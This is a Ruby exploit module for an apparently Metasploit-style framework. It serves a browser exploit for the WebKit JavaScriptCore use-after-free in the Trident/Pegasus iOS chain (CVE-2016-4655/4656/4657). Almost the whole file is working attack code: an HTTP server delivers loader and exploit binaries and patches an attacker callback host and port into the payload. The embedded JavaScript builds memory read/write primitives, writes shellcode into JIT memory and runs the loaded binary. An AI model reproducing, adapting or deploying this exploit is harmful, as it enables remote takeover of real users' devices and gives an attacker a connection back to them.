# frozen_string_literal: true

require 'webrick'
require_relative '../../lib/apex_module'

module ApexFramework
  module Modules
    class WebkitTrident < ApexModule

      info(
        name:            'WebKit not_number defineProperties UAF',
        category:        'browser',
        rank:            'manual',
        description:     'Exploits a UAF vulnerability in WebKit JavaScriptCore via the Trident/Pegasus chain (CVE-2016-4655/4656/4657).',
        authors:         ['qwertyoruiop', 'siguza', 'tihmstar', 'benjamin-42', 'timwr'],
        references:      [
          { type: 'CVE', id: '2016-4655' },
          { type: 'CVE', id: '2016-4656' },
          { type: 'CVE', id: '2016-4657' },
          { type: 'URL', id: 'https://blog.lookout.com/trident-pegasus' }
        ],
        disclosure_date: '2016-08-25',
        platform:        'apple_ios',
        arch:            'aarch64'
      )

      register_option :SRVHOST,      type: :string, required: true,  default: '127.0.0.1', description: 'HTTP listen address'
      register_option :SRVPORT,      type: :port,   required: true,  default: 8080,       description: 'HTTP listen port'
      register_option :URIPATH,      type: :string, required: false, default: '/',        description: 'URI path'
      register_option :LHOST,        type: :string, required: true,  description: 'Callback host for payload'
      register_option :LPORT,        type: :port,   required: true,  default: 4444,       description: 'Callback port'
      register_option :LOADER32_FILE,type: :string, required: false, default: '',         description: 'Path to 32-bit loader binary'
      register_option :LOADER64_FILE,type: :string, required: false, default: '',         description: 'Path to 64-bit loader binary'
      register_option :EXPLOIT_FILE, type: :string, required: false, default: '',         description: 'Path to exploit binary'

      def run
        log_status "Starting HTTP server on #{get(:SRVHOST)}:#{get(:SRVPORT)}"
        log_status "Payload callback: tcp://#{get(:LHOST)}:#{get(:LPORT)}"

        server = WEBrick::HTTPServer.new(
          BindAddress: get(:SRVHOST),
          Port:        get(:SRVPORT),
          Logger:      WEBrick::Log.new('/dev/null'),
          AccessLog:   []
        )

        server.mount_proc('/loader32') { |_req, res| serve_binary(res, :LOADER32_FILE, 'loader32') }
        server.mount_proc('/loader64') { |_req, res| serve_binary(res, :LOADER64_FILE, 'loader64') }
        server.mount_proc('/exploit64') { |_req, res| serve_exploit(res) }

        server.mount_proc(get(:URIPATH)) do |req, res|
          ua = req['User-Agent'] || 'unknown'
          log_status "Request from #{ua}"
          res['Content-Type'] = 'text/html'
          res.body = generate_html
          log_good 'Exploit page served'
        end

        log_good 'Server running. Waiting for target...'
        begin
          server.start
        rescue Interrupt
          log_status 'Shutting down HTTP server...'
        ensure
          server.shutdown
        end
      rescue StandardError => e
        log_error "HTTP server error: #{e.message}"
      end

      private

      def serve_binary(res, option_key, label)
        path = get(option_key)
        if path && !path.empty? && File.exist?(path)
          data = File.binread(path)
          res['Content-Type'] = 'application/octet-stream'
          res.body = data
          log_good "Sent #{label} (#{data.bytesize} bytes)"
        else
          log_warning "#{label} binary not configured or missing"
          res.status = 404
        end
      end

      def serve_exploit(res)
        path = get(:EXPLOIT_FILE)
        if path && !path.empty? && File.exist?(path)
          data = +File.binread(path)
          payload_url = "tcp://#{get(:LHOST)}:#{get(:LPORT)}"
          idx = data.index('PAYLOAD_URL')
          data[idx, payload_url.length] = payload_url if idx
          res['Content-Type'] = 'application/octet-stream'
          res.body = data
          log_good "Sent exploit64 (#{data.bytesize} bytes)"
        else
          log_warning 'Exploit binary not configured'
          res.status = 404
        end
      end

      def generate_html
        <<~HTML
          <html><body><script>
          function load_binary_resource(url) {
            var req = new XMLHttpRequest();
            req.open('GET', url, false);
            req.overrideMimeType('text/plain; charset=x-user-defined');
            req.send(null);
            return req.responseText;
          }
          var pressure = new Array(400);
          var bufs = new Array(10000);
          var fcp = 0;
          var smsh = new Uint32Array(0x10);
          var trycatch = "";
          for(var z=0; z<0x4000; z++) trycatch += "try{} catch(e){}; ";
          var fc = new Function(trycatch);
          function dgc() {
            for (var i = 0; i < pressure.length; i++) pressure[i] = new Uint32Array(0xa000);
            for (var i = 0; i < pressure.length; i++) pressure[i] = 0;
          }
          function swag() {
            if(bufs[0]) return;
            dgc();
            for (i=0; i < bufs.length; i++) {
              bufs[i] = new Uint32Array(0x100*2);
              for (k=0; k < bufs[i].length;) { bufs[i][k++] = 0x41414141; bufs[i][k++] = 0xffff0000; }
            }
          }
          var mem0=0, mem1=0, mem2=0;
          function read4(addr) { mem0[4] = addr; var ret = mem2[0]; mem0[4] = mem1; return ret; }
          function write4(addr, val) { mem0[4] = addr; mem2[0] = val; mem0[4] = mem1; }
          _dview = null;
          function u2d(low, hi) {
            if (!_dview) _dview = new DataView(new ArrayBuffer(16));
            _dview.setUint32(0, hi); _dview.setUint32(4, low);
            return _dview.getFloat64(0);
          }
          function go_(){
            var arr = new Array(0x100);
            var not_number = {};
            not_number.toString = function() { arr = null; props["stale"]["value"] = null; swag(); return 10; };
            smsh[0]=0x21212121; smsh[1]=0x31313131; smsh[2]=0x41414141; smsh[3]=0x51515151;
            smsh[4]=0x61616161; smsh[5]=0x71717171; smsh[6]=0x81818181; smsh[7]=0x91919191;
            var props = {
              p0:{value:0},p1:{value:1},p2:{value:2},p3:{value:3},
              p4:{value:4},p5:{value:5},p6:{value:6},p7:{value:7},p8:{value:8},
              length:{value:not_number}, stale:{value:arr}, after:{value:666}
            };
            var target = []; var stale = 0;
            Object.defineProperties(target, props);
            stale = target.stale;
            if (stale.length != 0x41414141){ location.reload(); return; }
            stale[0] = 0x12345678; stale[1] = {};
            for(var z=0; z<0x100; z++) fc();
            for (i=0; i < bufs.length; i++) {
              for (k=0; k < bufs[0].length; k++) {
                if (bufs[i][k] == 0x12345678) {
                  if (bufs[i][k+1] == 0xFFFF0000) {
                    stale[0] = fc; fcp = bufs[i][k];
                    stale[0] = {a:u2d(105,0),b:u2d(0,0),c:smsh,d:u2d(0x100,0)};
                    stale[1] = stale[0]; bufs[i][k] += 0x10;
                    var bck = stale[0][4]; stale[0][4]=0; stale[0][6]=0xffffffff;
                    mem0=stale[0]; mem1=bck; mem2=smsh; bufs.push(stale);
                    if (smsh.length != 0x10) {
                       var filestream = load_binary_resource("loader64");
                       var macho = load_binary_resource("exploit64");
                       var r2 = smsh[(fcp+0x18)/4]; var r3 = smsh[(r2+0x10)/4];
                       var jitf = smsh[(r3+0x10)/4];
                       write4(jitf, 0xd28024d0); write4(jitf+4, 0x58000060);
                       write4(jitf+8, 0xd4001001); write4(jitf+12, 0xd65f03c0);
                       write4(jitf+16, jitf+0x20); write4(jitf+20, 1); fc();
                       var dyncache = read4(jitf+0x20); var dyncachev = dyncache;
                       var go = 1;
                       while(go) {
                         if(read4(dyncache)==0xfeedfacf) {
                           for(var ii=0; ii<0x1000/4; ii++) {
                             if(read4(dyncache+ii*4)==0xd && read4(dyncache+ii*4+4)==0x40 &&
                                read4(dyncache+ii*4+8)==0x18 && read4(dyncache+ii*4+44)==0x61707369)
                             { go=0; break; }
                           }
                         }
                         dyncache += 0x1000;
                       }
                       dyncache -= 0x1000;
                       var shc = jitf;
                       for(var fi=0; fi<filestream.length;) {
                         var word = (filestream.charCodeAt(fi)&0xff)|((filestream.charCodeAt(fi+1)&0xff)<<8)|
                                    ((filestream.charCodeAt(fi+2)&0xff)<<16)|((filestream.charCodeAt(fi+3)&0xff)<<24);
                         write4(shc, word); shc+=4; fi+=4;
                       }
                       jitf &= ~0x3FFF; jitf += 0x8000;
                       write4(shc, jitf); write4(shc+4, 1);
                       for(var mi=0; mi<macho.length; mi+=4) {
                         var word = (macho.charCodeAt(mi)&0xff)|((macho.charCodeAt(mi+1)&0xff)<<8)|
                                    ((macho.charCodeAt(mi+2)&0xff)<<16)|((macho.charCodeAt(mi+3)&0xff)<<24);
                         write4(jitf+mi, word);
                       }
                       fc();
                    }
                  }
                  break;
                }
              }
            }
          }
          setTimeout(go_, 300);
          </script></body></html>
        HTML
      end
    end
  end
end

ApexFramework::ApexModule.register_module(
  'browser/webkit_trident',
  ApexFramework::Modules::WebkitTrident
)
